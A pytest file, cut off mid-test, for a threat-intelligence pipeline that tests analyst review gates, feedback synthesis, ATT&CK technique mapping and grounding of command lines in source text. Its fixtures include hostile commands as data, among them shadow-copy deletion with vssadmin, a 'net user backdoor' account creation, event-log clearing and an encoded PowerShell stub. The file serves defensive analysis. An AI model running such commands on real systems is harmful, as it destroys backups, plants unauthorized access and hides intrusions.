        # gate_0 clears gate0_reviews after consumption, but the analyst's
        # decisions survive on validated_entities. A run whose ONLY
        # corrections were entity removals used to skip synthesis entirely.
        state = {"validated_entities": [
            {"entity_id": "e1", "value": "Defender", "entity_type": "tool",
             "gate_action": "remove", "edit_rationale": "defensive tool"},
        ]}
        assert _had_real_reviews(state) is True

    def test_chunk_decisions_alone_count(self):
        # Legacy durable evidence: non-approve chunk_decisions (checkpoints
        # predating chunk_correction_log).
        state = {
            "chunks": [{"chunk_id": "c1", "text": "x"}],
            "chunk_decisions": [{"chunk_id": "c1", "action": "remove"}],
        }
        assert _had_real_reviews(state) is True

    def test_denylist_only_removals_still_skip(self):
        # Machine denylist auto-removals are not analyst reviews — a run with
        # ONLY those must keep skipping synthesis.
        state = {"validated_entities": [
            {"entity_id": "e1", "value": "cert.example", "entity_type": "ioc_domain",
             "gate_action": "remove", "denylisted": True},
        ]}
        assert _had_real_reviews(state) is False


class TestEntityDeltas:
    """_entity_deltas extracts non-approve analyst decisions."""

    def test_approves_excluded(self):
        state = {"validated_entities": [
            {"entity_id": "e1", "value": "APT29", "entity_type": "intrusion_set",
             "gate_action": "approve"},
        ]}
        assert _entity_deltas(state) == []

    def test_rejects_included_with_rationale(self):
        state = {"validated_entities": [
            {"entity_id": "e1", "value": "info@cert.example", "entity_type": "ioc_email",
             "confidence": 0.8, "gate_action": "reject",
             "edit_rationale": "Defender contact info, not adversary IoC"},
        ]}
        deltas = _entity_deltas(state)
        assert len(deltas) == 1
        assert deltas[0]["action"] == "reject"
        assert deltas[0]["edit_rationale"].startswith("Defender")

    def test_edits_capture_corrected_fields(self):
        state = {"validated_entities": [
            {"entity_id": "e1", "value": "ClickFix", "entity_type": "malware",
             "gate_action": "edit", "edited_type": "campaign",
             "edit_rationale": "Technique pattern brand name, not malware"},
        ]}
        deltas = _entity_deltas(state)
        assert len(deltas) == 1
        assert deltas[0]["edited_type"] == "campaign"

    def test_denylist_auto_removal_excluded(self):
        # gate_0's denylist guardrail sets gate_action=remove with no analyst
        # involved (even on gates-disabled runs). That's the machine echoing
        # an already-promoted pattern — not an analyst correction — so it
        # must not feed synthesis or the captured panel.
        state = {"validated_entities": [
            {"entity_id": "e1", "value": "cert.example", "entity_type": "ioc_domain",
             "gate_action": "remove", "denylisted": True,
             "edit_rationale": "Matches analyst denylist (pattern abc123)"},
        ]}
        assert _entity_deltas(state) == []

    def test_denylist_edit_still_included(self):
        # An analyst EDIT on a denylisted entity is real signal — only the
        # remove action is machine-attributable.
        state = {"validated_entities": [
            {"entity_id": "e1", "value": "cert.example", "entity_type": "ioc_domain",
             "gate_action": "edit", "denylisted": True,
             "edited_type": "ioc_url", "edit_rationale": "actually a URL"},
        ]}
        deltas = _entity_deltas(state)
        assert len(deltas) == 1
        assert deltas[0]["action"] == "edit"

    def test_plain_remove_still_included(self):
        # Analyst removals of non-denylisted entities remain real corrections.
        state = {"validated_entities": [
            {"entity_id": "e1", "value": "Defender", "entity_type": "tool",
             "gate_action": "remove",
             "edit_rationale": "defensive tool, not adversary tooling"},
        ]}
        deltas = _entity_deltas(state)
        assert len(deltas) == 1
        assert deltas[0]["action"] == "remove"


class TestChunkDeltas:
    """_chunk_deltas captures drops/edits/wholesale rejects/analyst-added."""

    def test_drop_captured(self):
        state = {
            "chunks": [{"chunk_id": "c1", "text": "the actor did x"}],
            "chunk_decisions": [{"chunk_id": "c1", "action": "drop", "rationale": "duplicate"}],
        }
        deltas = _chunk_deltas(state)
        assert any(d.get("action") == "drop" for d in deltas)

    def test_wholesale_reject_emits_kind_entry(self):
        state = {
            "chunks": [],
            "chunk_decisions": [],
            "chunk_rerun_feedback": {"reason": "missed_procedures",
                                     "comments": "Source describes RDP enable; not chunked."},
        }
        deltas = _chunk_deltas(state)
        assert any(d.get("kind") == "wholesale_reject" for d in deltas)

    def test_ledger_takes_precedence_over_transients(self):
        """When the durable chunk_correction_log exists, it IS the delta set —
        the transient channels the gate also wrote must not double-count."""
        state = {
            "chunk_correction_log": [
                {"kind": "wholesale_reject", "reason": "over_chunked",
                 "comments": "merge 2+3"},
                {"chunk_id": "c1", "original_text": "certutil fetch",
                 "action": "remove", "edits": None, "rationale": "dup"},
            ],
            # Transients that would have produced overlapping deltas:
            "chunk_rerun_feedback": {"reason": "over_chunked", "comments": "merge 2+3"},
            "chunks": [{"chunk_id": "c1", "text": "certutil fetch"}],
            "chunk_decisions": [{"chunk_id": "c1", "action": "remove"}],
        }
        deltas = _chunk_deltas(state)
        assert len(deltas) == 2
        assert deltas[0]["kind"] == "wholesale_reject"
        assert deltas[1]["chunk_id"] == "c1"

    def test_ledger_survives_cleared_transients(self):
        """The synthesis-time reality: transients cleared, ledger remains."""
        state = {
            "chunk_correction_log": [
                {"kind": "analyst_added", "text": "cleared event logs",
                 "source_excerpt": "wevtutil cl"},
            ],
            "chunk_rerun_feedback": None,
            "chunk_reviews": {},
            "chunk_decisions": [{"chunk_id": "c9", "action": "approve"}],
        }
        deltas = _chunk_deltas(state)
        assert len(deltas) == 1
        assert deltas[0]["kind"] == "analyst_added"

    def test_analyst_added_chunks_captured(self):
        state = {
            "chunks": [],
            "chunk_decisions": [],
            "chunk_reviews": {"added_chunks": [
                {"text": "The actor enabled RDP via fDenyTSConnections=0",
                 "source_excerpt": "fDenyTSConnections value 0..."},
            ]},
        }
        deltas = _chunk_deltas(state)
        assert any(d.get("kind") == "analyst_added" for d in deltas)


class TestProcedureDeltas:
    """_procedure_deltas captures Gate 1 rejects + promotions."""

    def test_reject_with_reason(self):
        state = {
            "drafts": [{"draft_id": "d1", "name": "Drop Cobalt Strike via PowerShell"}],
            "gate1_decisions": [{"draft_id": "d1", "action": "reject",
                                 "reason": "wrong_technique",
                                 "feedback": "Picked T1059.001 but source shows AutoIt path"}],
        }
        deltas = _procedure_deltas(state)
        assert len(deltas) == 1
        assert deltas[0]["reject_reason"] == "wrong_technique"

    def test_promotion_captured(self):
        state = {
            "drafts": [],
            "gate1_decisions": [],
            "gate1_promotions": [{"chunk_id": "c1", "technique_id": "T1204.004"}],
        }
        deltas = _procedure_deltas(state)
        assert any(d.get("kind") == "promotion" and d.get("technique_id") == "T1204.004"
                   for d in deltas)

    def test_reads_correction_log_with_techniques(self):
        # The durable log is the source of truth; it carries the rejected +
        # corrected techniques even though the original draft was regenerated
        # away by the re-extract loop (drafts list is the final, fresh-id pass).
        state = {
            "drafts": [],
            "gate1_decisions": [],  # overwritten by the final all-approve pass
            "gate1_correction_log": [{
                "draft_id": "dft-001", "draft_name": "Deliver lure",
                "chunk_id": "chk-001", "action": "reject",
                "reject_reason": "wrong_technique", "rationale": "delivery not exec",
                "rejected_techniques": [
                    {"technique_id": "T1204.002", "technique_name": "Malicious File", "tactic": "execution"},
                ],
                "corrected_techniques": [
                    {"technique_id": "T1566.001", "technique_name": "Spearphishing Attachment", "tactic": "initial-access"},
                ],
            }],
        }
        deltas = _procedure_deltas(state)
        assert len(deltas) == 1
        d = deltas[0]
        assert d["reject_reason"] == "wrong_technique"
        assert any(t["technique_id"] == "T1204.002" for t in d["rejected_techniques"])
        assert any(t["technique_id"] == "T1566.001" for t in d["corrected_techniques"])

    def test_correction_log_takes_precedence_over_decisions(self):
        # gate1_decisions reflects only the final all-approve pass; the reject
        # lives in the durable log. The reject must surface, not the approves.
        state = {
            "drafts": [],
            "gate1_decisions": [{"draft_id": "x", "action": "approve"}],
            "gate1_correction_log": [{
                "draft_id": "dft-001", "draft_name": "n", "chunk_id": "chk-001",
                "action": "reject", "reject_reason": "hallucinated", "rationale": "",
                "rejected_techniques": [], "corrected_techniques": [],
            }],
        }
        deltas = _procedure_deltas(state)
        assert [d["reject_reason"] for d in deltas] == ["hallucinated"]

    def test_promote_record_from_log_surfaces_as_promotion(self):
        # gate_1 clears the transient gate1_promotions in the same update
        # that applies it; the log record is what reaches synthesis.
        state = {
            "drafts": [],
            "gate1_promotions": [],  # already consumed
            "gate1_correction_log": [{
                "action": "promote", "chunk_id": "chk-001",
                "technique_id": "T1204.004",
            }],
        }
        deltas = _procedure_deltas(state)
        assert len(deltas) == 1
        assert deltas[0]["kind"] == "promotion"
        assert deltas[0]["technique_id"] == "T1204.004"
        # Promotion records must not leak draft-shaped fields like
        # rejected_techniques (would confuse anchors/digest).
        assert "rejected_techniques" not in deltas[0]


class TestCapturedCorrections:
    """captured_corrections flattens in-flight deltas into UI items, reusing
    the same _compute_deltas the synthesizer consumes (so 'captured' == 'will
    be synthesized')."""

    def test_empty_state(self):
        assert captured_corrections({}) == []

    def test_all_approved_is_empty(self):
        # Approve-only entities + all-approve gate1 log -> nothing to show.
        state = {
            "validated_entities": [{"entity_id": "e1", "value": "x", "gate_action": "approve"}],
            "gate1_correction_log": [],
        }
        assert captured_corrections(state) == []

    def test_gate1_reject_surfaced_with_techniques(self):
        state = {
            "gate1_correction_log": [{
                "action": "reject", "reject_reason": "bad_chunk_boundary",
                "chunk_id": "chk-1", "draft_name": "Deliver lure",
                "rejected_techniques": [{"technique_id": "T1566.001"}],
                "corrected_techniques": [], "rationale": "split this chunk",
            }],
        }
        items = captured_corrections(state)
        assert len(items) == 1
        it = items[0]
        assert it["gate"] == "techniques"
        assert "Deliver lure" in it["summary"]
        assert "bad_chunk_boundary" in it["summary"]
        assert "T1566.001" in it["detail"]
        assert "split this chunk" in it["detail"]

    def test_entity_removal_surfaced(self):
        state = {
            "validated_entities": [{
                "entity_id": "e1", "value": "ClickFix", "entity_type": "malware",
                "gate_action": "remove", "edit_rationale": "technique pattern, not malware",
            }],
        }
        items = captured_corrections(state)
        assert len(items) == 1
        assert items[0]["gate"] == "entities"
        assert "ClickFix" in items[0]["summary"]
        assert "technique pattern" in items[0]["detail"]

    def test_promotion_surfaced(self):
        state = {"gate1_promotions": [{"chunk_id": "c1", "technique_id": "T1204.004"}]}
        items = captured_corrections(state)
        assert any("T1204.004" in it["summary"] for it in items)

    def test_edit_detail_uses_revision_labels(self):
        """Edits render removed/added — not 'rejected: ... → correct: ...',
        which implied a wholesale rejection the analyst never made."""
        state = {
            "gate1_correction_log": [{
                "action": "edit", "chunk_id": "chk-1", "draft_name": "Deploy RAT",
                "reject_reason": "", "rationale": "",
                "rejected_techniques": [{"technique_id": "T1105"}],
                "corrected_techniques": [
                    {"technique_id": "T1059.001"}, {"technique_id": "T1219"},
                ],
                "added_techniques": [{"technique_id": "T1219"}],
            }],
        }
        items = captured_corrections(state)
        assert len(items) == 1
        detail = items[0]["detail"]
        assert "removed: T1105" in detail
        assert "added: T1219" in detail
        assert "rejected:" not in detail
        assert "→ correct" not in detail

    def test_matches_compute_deltas_count(self):
        # captured items should equal the number of non-approve deltas across gates.
        state = {
            "validated_entities": [
                {"entity_id": "e1", "value": "a", "gate_action": "remove"},
                {"entity_id": "e2", "value": "b", "gate_action": "approve"},
            ],
            "gate1_correction_log": [
                {"action": "reject", "reject_reason": "wrong_technique", "chunk_id": "c1",
                 "draft_name": "n", "rejected_techniques": [], "corrected_techniques": []},
            ],
        }
        deltas = _compute_deltas(state)
        expected = sum(len(v) for v in deltas.values())
        assert len(captured_corrections(state)) == expected


class TestRelationshipDeltas:
    """_relationship_deltas captures Gate 2 removes/edits + wholesale reject."""

    def test_remove_captured(self):
        state = {"gate2_reviews": [
            {"rel_id": "rel-1", "action": "remove",
             "rationale": "Defender CERT entity wrongly linked as victim"},
        ]}
        deltas = _relationship_deltas(state)
        assert deltas[0]["action"] == "remove"

    def test_wholesale_reject(self):
        state = {"gate2_decision": {"approved": False,
                                    "feedback": "C2 domains not linked to procedure"}}
        deltas = _relationship_deltas(state)
        assert any(d.get("kind") == "wholesale_reject" for d in deltas)


class TestDeltasHaveSignal:
    """_deltas_have_signal short-circuits when nothing was changed."""

    def test_empty(self):
        assert _deltas_have_signal({"gate_0_entities": [], "gate_chunks": [],
                                    "gate_1_procedures": [], "gate_2_relationships": []}) is False

    def test_any_signal(self):
        assert _deltas_have_signal({"gate_0_entities": [{"action": "reject"}],
                                    "gate_chunks": [], "gate_1_procedures": [],
                                    "gate_2_relationships": []}) is True


class TestSynthesizeFeedbackSkipPaths:
    """Skip paths return early without invoking the LLM or writing to DB."""

    @pytest.mark.asyncio
    @patch("app.nodes.llm.feedback_synthesis.call_llm", new_callable=AsyncMock)
    async def test_no_reviews_skips_llm(self, mock_call):
        result = await synthesize_feedback({"source_id": "abc"})
        mock_call.assert_not_called()
        assert result["feedback_synthesis"]["status"] == "skipped_no_reviews"
        assert result["feedback_pattern_ids"] == []
        # Regression: synthesize_feedback is the LAST node; must write
        # pipeline-level COMPLETED so the source advances out of the
        # SYNTHESIZING_FEEDBACK status and the queue row marks the run done.
        assert result["status"] == PipelineStatus.COMPLETED.value

    @pytest.mark.asyncio
    @patch("app.nodes.llm.feedback_synthesis.call_llm", new_callable=AsyncMock)
    async def test_upstream_failure_is_not_flipped_to_completed(self, mock_call):
        """distribute -> synthesize_feedback is an unconditional edge, so a
        run distribute already marked FAILED still lands here. Writing
        COMPLETED would turn a failed run green while state["error"] still
        holds the reason."""
        result = await synthesize_feedback({
            "source_id": "abc",
            "status": PipelineStatus.FAILED.value,
            "error": "Neo4j write failed: ConnectionError",
        })
        mock_call.assert_not_called()
        assert result["status"] == PipelineStatus.FAILED.value

    @pytest.mark.asyncio
    @patch("app.nodes.llm.feedback_synthesis.call_llm", new_callable=AsyncMock)
    async def test_reviews_with_zero_deltas_skips_llm(self, mock_call):
        # Reviews exist but all approve → no signal to synthesize
        state = {
            "source_id": "abc",
            "gate0_reviews": [{"entity_id": "e1", "action": "approve"}],
            "validated_entities": [{"entity_id": "e1", "gate_action": "approve",
                                    "value": "APT29", "entity_type": "intrusion_set"}],
        }
        result = await synthesize_feedback(state)
        mock_call.assert_not_called()
        assert result["feedback_synthesis"]["status"] == "skipped_no_deltas"

    @pytest.mark.asyncio
    @patch("app.nodes.llm.feedback_synthesis.call_llm", new_callable=AsyncMock)
    async def test_llm_failure_does_not_raise(self, mock_call):
        """Failures are caught and reported via feedback_synthesis['status']."""
        mock_call.side_effect = RuntimeError("API timeout")
        state = {
            "source_id": "abc",
            # Trigger _had_real_reviews → True so we get past the skip,
            # plus a non-approve validated_entities entry so deltas are non-empty
            # and the synthesizer reaches the LLM call.
            "gate0_reviews": [{"entity_id": "e1", "action": "reject"}],
            "validated_entities": [{"entity_id": "e1", "gate_action": "reject",
                                    "value": "info@cert.example", "entity_type": "ioc_email",
                                    "edit_rationale": "Defender contact"}],
        }
        result = await synthesize_feedback(state)
        assert result["feedback_synthesis"]["status"] == "failed"
        assert "API timeout" in result["feedback_synthesis"]["error"]


class TestFormatDeltasForSynthesis:
    """_format_deltas_for_synthesis renders deltas as human-readable digest."""

    def test_includes_all_four_gate_sections(self):
        deltas = {
            "gate_0_entities": [{"action": "reject", "value": "x", "entity_type": "ioc_url"}],
            "gate_chunks": [{"action": "drop", "chunk_id": "c1"}],
            "gate_1_procedures": [{"action": "reject", "draft_id": "d1"}],
            "gate_2_relationships": [{"action": "remove", "rel_id": "r1"}],
        }
        out = _format_deltas_for_synthesis(deltas)
        assert "Gate 0" in out
        assert "gate_chunks" in out
        assert "Gate 1" in out
        assert "Gate 2" in out

    def test_empty_sections_render_no_action_marker(self):
        deltas = {"gate_0_entities": [], "gate_chunks": [],
                  "gate_1_procedures": [], "gate_2_relationships": []}
        out = _format_deltas_for_synthesis(deltas)
        assert "no non-approve actions" in out

    def test_edit_rendered_as_revision_not_rejection(self):
        """An edit's removed/added techniques render as a revision. The kept
        technique (present only in the full corrected list) must not appear —
        rendering it taught the synthesizer corrections never made."""
        deltas = {
            "gate_0_entities": [], "gate_chunks": [], "gate_2_relationships": [],
            "gate_1_procedures": [{
                "action": "edit", "draft_id": "d1",
                "rejected_techniques": [{"technique_id": "T1105"}],
                "added_techniques": [{"technique_id": "T1219"}],
                "corrected_techniques": [
                    {"technique_id": "T1059.001"}, {"technique_id": "T1219"},
                ],
            }],
        }
        out = _format_deltas_for_synthesis(deltas)
        assert "analyst removed: T1105" in out
        assert "analyst added: T1219" in out
        assert "LLM-picked (rejected)" not in out
        assert "T1059.001" not in out  # kept technique — not a correction

    def test_reject_still_rendered_as_rejection_with_correction(self):
        deltas = {
            "gate_0_entities": [], "gate_chunks": [], "gate_2_relationships": [],
            "gate_1_procedures": [{
                "action": "reject", "draft_id": "d1",
                "reject_reason": "wrong_technique",
                "rejected_techniques": [{"technique_id": "T1190"}],
                "corrected_techniques": [{"technique_id": "T1566.001"}],
                "added_techniques": [{"technique_id": "T1566.001"}],
            }],
        }
        out = _format_deltas_for_synthesis(deltas)
        assert "LLM-picked (rejected): T1190" in out
        assert "analyst-corrected to: T1566.001" in out

    def test_chunk_wholesale_reject_carries_its_reason(self):
        """The reason code states the analyst's INTENT and must reach the LLM.

        Without it a `missed_procedures` reject (add this) is indistinguishable
        from a `bad_flow` one (fix this) — both arrive as a bare rejection plus
        prose about what the source said. On a real run that produced a rule
        telling the chunker to EXCLUDE content the analyst had rejected a whole
        pass in order to have INCLUDED.
        """
        deltas = {
            "gate_0_entities": [], "gate_1_procedures": [], "gate_2_relationships": [],
            "gate_chunks": [{
                "kind": "wholesale_reject",
                "reason": "missed_procedures",
                "comments": "an alternative initial access was proposed by the author",
            }],
        }
        out = _format_deltas_for_synthesis(deltas)
        assert "reason: missed_procedures" in out
        assert "an alternative initial access" in out

    def test_chunk_wholesale_reject_reads_as_whole_pass_not_missing_id(self):
        """A wholesale reject has no chunk_id; "chunk_id=?" read as data loss."""
        deltas = {
            "gate_0_entities": [], "gate_1_procedures": [], "gate_2_relationships": [],
            "gate_chunks": [{"kind": "wholesale_reject", "reason": "bad_flow"}],
        }
        out = _format_deltas_for_synthesis(deltas)
        assert "(entire chunking pass)" in out
        assert "chunk_id=?" not in out

    def test_chunk_edit_carries_what_the_analyst_changed(self):
        """An edit says what CORRECT looks like, not just that something was
        wrong — the most precise signal a chunk gate produces. It was carried in
        the delta and dropped by the formatter, so a rewritten chunk reached the
        synthesizer as a bare [edit] line."""
        deltas = {
            "gate_0_entities": [], "gate_1_procedures": [], "gate_2_relationships": [],
            "gate_chunks": [{
                "action": "edit", "chunk_id": "chk-7ac08e26",
                "edits": {"text": "Zerologon identified via telemetry",
                          "behavioral_confidence": "0.85"},
            }],
        }
        out = _format_deltas_for_synthesis(deltas)
        assert "analyst edits:" in out
        assert "Zerologon identified via telemetry" in out
        assert "0.85" in out

    def test_promotion_keyed_by_chunk_not_a_missing_draft_id(self):
        """_procedure_deltas emits kind/chunk_id/technique_id for a promotion —
        no draft_id exists, so every one rendered 'draft_id=?'."""
        deltas = {
            "gate_0_entities": [], "gate_chunks": [], "gate_2_relationships": [],
            "gate_1_procedures": [{
                "kind": "promotion", "chunk_id": "chk-78318d3c",
                "technique_id": "T1210",
            }],
        }
        out = _format_deltas_for_synthesis(deltas)
        assert "chunk_id=chk-78318d3c" in out
        assert "promoted technique: T1210" in out
        assert "draft_id=?" not in out

    def test_per_chunk_decision_still_shows_its_id(self):
        deltas = {
            "gate_0_entities": [], "gate_1_procedures": [], "gate_2_relationships": [],
            "gate_chunks": [{"action": "drop", "chunk_id": "chk-abc123",
                             "rationale": "duplicate of chk-def456"}],
        }
        out = _format_deltas_for_synthesis(deltas)
        assert "chunk_id=chk-abc123" in out
        assert "rationale: duplicate of chk-def456" in out


class TestDeltaAnchors:
    """_delta_anchors folds only ACTUAL corrections (rejected + added) into
    the MISS-scoring anchor set — never the corrected list, where an edit's
    kept techniques live."""

    def test_kept_techniques_not_anchored(self):
        d = {
            "action": "edit",
            "rejected_techniques": [{"technique_id": "T1105"}],
            "added_techniques": [{"technique_id": "T1219"}],
            "corrected_techniques": [
                {"technique_id": "T1059.001"},  # kept — analyst confirmed it
                {"technique_id": "T1219"},
            ],
        }
        anchors = _delta_anchors(d)
        assert anchors["technique_ids"] == {"T1105", "T1219"}
        # A pattern about the kept T1059.001 must NOT anchor-match (it would
        # be scored MISS for advice the analyst followed).
        assert "T1059.001" not in anchors["technique_ids"]

    def test_reject_anchors_full_rejected_list(self):
        d = {
            "action": "reject",
            "rejected_techniques": [
                {"technique_id": "T1190"}, {"technique_id": "T1059.001"},
            ],
            "corrected_techniques": [], "added_techniques": [],
        }
        anchors = _delta_anchors(d)
        assert anchors["technique_ids"] == {"T1190", "T1059.001"}

    def test_promotion_flat_technique_id_still_anchored(self):
        d = {"kind": "promotion", "technique_id": "T1204.004"}
        assert _delta_anchors(d)["technique_ids"] == {"T1204.004"}


class TestBuildTechniqueRerunContext:
    """Action-aware rendering of Gate 1 feedback into the rerun prompt."""

    def test_reject_renders_rejected_line(self):
        fb = [{
            "chunk_id": "chk-1", "action": "reject",
            "reject_reason": "wrong_technique", "rationale": "delivery not exploit",
            "rejected_techniques": [{"technique_id": "T1190"}],
            "corrected_techniques": [{"technique_id": "T1566.001"}],
            "added_techniques": [{"technique_id": "T1566.001"}],
        }]
        out = _build_technique_rerun_context(fb)
        assert "previously picked T1190 — REJECTED" in out
        assert "correct technique(s) are: T1566.001" in out
        assert "delivery not exploit" in out

    def test_edit_renders_revision_not_rejected(self):
        """Kept techniques must not be rendered as REJECTED — that steered
        the rerun away from picks the analyst explicitly confirmed."""
        fb = [{
            "chunk_id": "chk-1", "action": "edit", "reject_reason": "",
            "rationale": "",
            "rejected_techniques": [{"technique_id": "T1105"}],  # removed only
            "corrected_techniques": [
                {"technique_id": "T1059.001"}, {"technique_id": "T1219"},
            ],
            "added_techniques": [{"technique_id": "T1219"}],
        }]
        out = _build_technique_rerun_context(fb)
        assert "REVISED" in out
        assert "Removed (wrong for this chunk): T1105" in out
        assert "Added (missed previously): T1219" in out
        assert "REJECTED" not in out
        assert "correct technique(s) are: T1059.001, T1219" in out

    def test_edit_to_empty_renders_none_apply(self):
        fb = [{
            "chunk_id": "chk-1", "action": "edit", "reject_reason": "",
            "rationale": "",
            "rejected_techniques": [{"technique_id": "T1190"}],
            "corrected_techniques": [], "added_techniques": [],
        }]
        out = _build_technique_rerun_context(fb)
        assert "NONE of the previously picked" in out

    def test_legacy_entry_without_action_renders_as_reject(self):
        # Stale checkpoints predate the action field — default to the
        # original reject rendering rather than crashing or mislabeling.
        fb = [{
            "chunk_id": "chk-1", "reject_reason": "wrong_technique",
            "rejected_techniques": [{"technique_id": "T1190"}],
            "corrected_techniques": [],
        }]
        out = _build_technique_rerun_context(fb)
        assert "previously picked T1190 — REJECTED" in out

    def test_empty_feedback_returns_empty_string(self):
        assert _build_technique_rerun_context(None) == ""
        assert _build_technique_rerun_context([]) == ""


class TestFuzzySourceSpanAnchoring:
    """source_span survives whitespace reflow and partial paraphrase.

    On a prose-heavy report the chunker synthesizes each excerpt from several
    sentences, so exact `parsed_text.find()` misses for most chunks — the audit
    measured 6 of 10 null spans. A null span is precisely when the analyst most
    needs the source-pane link, so tolerant anchoring is the fix.
    """

    TEXT = (
        "The threat actor modified the RunMRU registry key for the current user\n"
        "to include an obfuscated command string.\n\n"
        "Later the actor executed the native Windows tar.exe utility."
    )

    @staticmethod
    def _chunk(cid, seq, excerpt, pred=None):
        return {
            "chunk_id": cid, "sequence_index": seq, "source_excerpt": excerpt,
            "predecessor_indices": pred or [], "text": "t", "artifacts": {},
            "chain_root": False, "chain_label": "",
        }

    def test_exact_match_still_wins(self):
        c = self._chunk("c1", 1, "modified the RunMRU registry key")
        out = _finalize_chunks([c], self.TEXT, True)
        span = out[0]["source_span"]
        assert self.TEXT[span[0]:span[1]] == "modified the RunMRU registry key"

    def test_excerpt_spanning_a_newline_now_anchors(self):
        """Previously null: the excerpt reads across a line break."""
        c = self._chunk(
            "c1", 1,
            "for the current user to include an obfuscated command string",
        )
        out = _finalize_chunks([c], self.TEXT, True)
        assert out[0]["source_span"] is not None
        assert out[0]["source_provenance"] == "prose"

    def test_partially_paraphrased_excerpt_anchors_to_the_matching_prefix(self):
        c = self._chunk(
            "c1", 1,
            "the actor executed the native Windows tar.exe utility and then "
            "did something the report never actually described",
        )
        out = _finalize_chunks([c], self.TEXT, True)
        span = out[0]["source_span"]
        assert span is not None
        # The span covers only what genuinely matched — it must not over-claim.
        assert "tar.exe" in self.TEXT[span[0]:span[1]]
        assert "never actually described" not in self.TEXT[span[0]:span[1]]

    def test_genuine_miss_still_returns_none(self):
        """A wrong span is worse than no span."""
        c = self._chunk("c1", 1, "an unrelated sentence about kangaroos today")
        out = _finalize_chunks([c], self.TEXT, True)
        assert out[0]["source_span"] is None
        assert out[0]["source_provenance"] == "paraphrased"

    def test_short_excerpt_below_floor_is_not_force_matched(self):
        c = self._chunk("c1", 1, "xyzzy nope")
        out = _finalize_chunks([c], self.TEXT, True)
        assert out[0]["source_span"] is None


class TestParentTechniqueExpansion:
    """Sub-techniques in the pool bring their parent.

    The retriever expands parents for its own picks, but T-IDs added later —
    LLM proposals and brand expansion — bypassed that.
    The result was the audit's dominant error mode: right family, wrong
    member, with the correct answer in NEITHER lane, so there was nothing for
    the analyst to promote at gate_1.
    """

    CATALOGUE = {
        "T1553": {"name": "Subvert Trust Controls"},
        "T1553.001": {"name": "Gatekeeper Bypass"},
        "T1567": {"name": "Exfiltration Over Web Service"},
        "T1567.002": {"name": "Exfiltration to Cloud Storage"},
        "T1059": {"name": "Command and Scripting Interpreter"},
    }

    def test_parent_is_added_for_a_sub_technique(self):
        from app.nodes.llm.technique_extraction import _expand_parents

        pool = {"T1553.001": self.CATALOGUE["T1553.001"]}
        out = _expand_parents(pool, self.CATALOGUE)
        # The exact audit miss: a macOS-only sub surfaced for a Windows
        # SSL-revocation bypass while the applicable parent never appeared.
        assert "T1553" in out

    def test_exfiltration_parent_recovers_the_second_audit_miss(self):
        from app.nodes.llm.technique_extraction import _expand_parents

        pool = {"T1567.002": self.CATALOGUE["T1567.002"]}
        out = _expand_parents(pool, self.CATALOGUE)
        assert "T1567" in out

    def test_existing_entries_are_untouched(self):
        from app.nodes.llm.technique_extraction import _expand_parents

        pool = {"T1059": self.CATALOGUE["T1059"]}
        out = _expand_parents(pool, self.CATALOGUE)
        assert out == {"T1059": self.CATALOGUE["T1059"]}

    def test_parent_absent_from_the_catalogue_is_skipped(self):
        """Deprecated or filtered parents must not crash the pool build."""
        from app.nodes.llm.technique_extraction import _expand_parents

        out = _expand_parents({"T9999.001": {}}, {})
        assert out == {"T9999.001": {}}


class TestCommandLineGrounding:
    """Command lines reach the model and only source-grounded ones survive.

    The drafting prompt demands verbatim commands, so what it is shown
    decides whether `x_components_refs` is ever populated: the chunk text
    is a paraphrase, the excerpt and the Gate 0 ioc_command_line entities
    are verbatim. The backstop enforces the "no fabricated command lines"
    rule that the prompt can only ask for.
    """

    CMD = "vssadmin.exe delete shadows /all /quiet"
    PARSED = (
        "Initial access was via a phishing email.\n\n"
        "Before encryption the operators removed recovery points by running\n"
        "vssadmin.exe delete shadows\n/all /quiet\n"
        "on each host. Encryption then began.\n"
    )
    ENTITIES = [
        {"entity_type": "ioc_command_line", "value": CMD, "gate_action": "approve"},
        {"entity_type": "ioc_command_line", "value": "net user backdoor P@ss /add",
         "gate_action": "remove"},
        {"entity_type": "tool", "value": "vssadmin", "gate_action": "approve"},
    ]

    def _chunk(self, **over):
        base = {
            "chunk_id": "chk-vss",
            "text": "The operators deleted shadow copies before encrypting.",
            "source_excerpt": "Before encryption the operators removed recovery points by running",
            "sequence_index": 1,
            "source_span": (41, 108),
        }
        base.update(over)
        return base

    def test_captured_commands_skip_removed_entities(self):
        from app.nodes.llm.drafting import _captured_command_lines

        assert _captured_command_lines(self.ENTITIES) == [self.CMD]

    def test_formatter_shows_excerpt_and_per_chunk_commands(self):
        from app.nodes.llm.drafting import _format_chunks_with_techniques

        out = _format_chunks_with_techniques(
            [self._chunk()], {}, None,
            validated_entities=self.ENTITIES, parsed_text=self.PARSED,
        )
        assert "SOURCE EXCERPT (verbatim): Before encryption" in out
        assert "CAPTURED COMMAND LINES" in out
        assert f"    - {self.CMD}" in out

    def test_formatter_attributes_by_source_window_not_paraphrase(self):
        """The command sits after the excerpt in parsed_text; the span window
        catches it even though neither text nor excerpt contains it."""
        from app.nodes.llm.drafting import _format_chunks_with_techniques

        far = self._chunk(chunk_id="chk-far", text="Phishing email.",
                          source_excerpt="Initial access was via a phishing email.",
                          source_span=(0, 40))
        out = _format_chunks_with_techniques(
            [far], {}, None,
            validated_entities=self.ENTITIES, parsed_text=self.PARSED,
        )
        # Window leans forward 1500 chars, so this short text still matches;
        # the point is that the match comes from parsed_text, not the chunk.
        assert self.CMD in out
        # Without parsed_text the same chunk has nothing to attribute.
        out2 = _format_chunks_with_techniques(
            [far], {}, None, validated_entities=self.ENTITIES, parsed_text="",
        )
        assert "CAPTURED COMMAND LINES" not in out2

    def test_formatter_without_entities_adds_no_command_block(self):
        from app.nodes.llm.drafting import _format_chunks_with_techniques

        out = _format_chunks_with_techniques([self._chunk()], {}, None)
        assert "CAPTURED COMMAND LINES" not in out
        assert "SOURCE EXCERPT" in out

    def test_grounding_keeps_source_and_captured_drops_fabricated(self, caplog):
        from app.nodes.llm.drafting import _ground_command_lines

        fabricated = "powershell -enc SQBFAFgA"
        with caplog.at_level("WARNING", logger="app.nodes.llm.drafting"):
            kept = _ground_command_lines(
                [self.CMD, "VSSADMIN.EXE  delete shadows /all /quiet", fabricated, "", 7],
                self._chunk(), self.PARSED, [self.CMD], "Delete Shadow Copies",
            )
        assert kept == [self.CMD]
        assert "Delete Shadow Copies" in caplog.text
        assert fabricated in caplog.text

    def test_grounding_tolerates_line_breaks_in_parsed_text(self):
        """PDF extraction splits the command across lines; whitespace-
        normalized matching still finds it with no captured entity."""
        from app.nodes.llm.drafting import _ground_command_lines

